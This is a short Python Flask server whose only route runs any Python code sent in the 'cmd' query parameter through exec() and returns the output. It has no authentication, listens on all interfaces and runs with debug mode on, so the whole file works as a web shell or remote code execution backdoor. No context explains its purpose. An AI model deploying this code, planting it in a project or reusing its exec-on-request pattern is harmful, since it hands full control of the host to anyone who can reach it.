from flask import *
import sys, os
from io import StringIO
import contextlib
app = Flask(__name__)

@contextlib.contextmanager
def stdoutIO(stdout=None):
    old = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = old

@app.route('/',methods=['GET','POST'])
def index():
	try:
		with stdoutIO() as e:
			exec(request.args.get('cmd'))
		return str(e.getvalue())
	except Exception as e:
		return str(e)
app.run(host='0.0.0.0',port=int(os.environ.get('PORT','5000')), debug=True)
